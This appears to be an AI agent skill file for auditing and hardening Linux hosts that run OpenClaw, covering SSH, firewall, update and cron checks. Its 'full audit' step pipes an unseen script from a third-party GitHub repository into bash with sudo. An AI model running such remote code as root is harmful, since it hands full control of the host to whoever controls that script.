---
name: healthcheck
description: Host security hardening and risk-tolerance configuration for OpenClaw deployments. Use when Z asks for security audits, firewall/SSH/update hardening, risk posture review, OpenClaw cron scheduling for periodic checks, or version status checks. Covers Linux hosts (laptop, workstation, Pi, VPS).
---

# Healthcheck Skill

Security hardening and risk assessment for hosts running OpenClaw.

## Prerequisites

- Root/sudo access
- Linux host (tested on Ubuntu, Debian, Raspbian)

## Run Full Audit

```bash
# Full security audit
sudo bash <(curl -s https://raw.githubusercontent.com/0x-wzw/swarm-agent-kit/main/skills/healthcheck/scripts/audit.sh)

# Quick check
bash scripts/healthcheck-quick.sh
```

## Core Checks

### SSH Hardening
```bash
# Check SSH config
sshd -t
# Verify PermitRootLogin is no
grep "^PermitRootLogin" /etc/ssh/sshd_config
# Verify password auth is disabled
grep "^PasswordAuthentication" /etc/ssh/sshd_config
```

### Firewall
```bash
# Check UFW status
sudo ufw status verbose
# Check open ports
sudo ss -tulpn | grep LISTEN
```

### Updates
```bash
# Check pending updates
apt list --upgradable 2>/dev/null | grep -v "^Listing"
# Check last boot time
uptime
who -b
```

### OpenClaw Status
```bash
openclaw gateway status
openclaw --version
```

## Periodic Checks (Cron)

Add to crontab for automatic periodic audits:
```bash
# Daily health check at 6am
0 6 * * * /path/to/scripts/healthcheck.sh >> /var/log/healthcheck.log 2>&1
```

## Risk Levels

| Level | Meaning | Action |
|-------|---------|--------|
| CRITICAL | Immediate vulnerability | Fix now |
| HIGH | Significant risk | Fix within 24h |
| MEDIUM | Moderate exposure | Fix within week |
| LOW | Minor improvement | Schedule fix |

## Common Fixes

```bash
# Disable root login
sudo sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# Enable UFW default deny
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Enable automatic security updates
sudo apt install unattended-upgrades
sudo dpkg-reconfigure unattended-upgrades
```
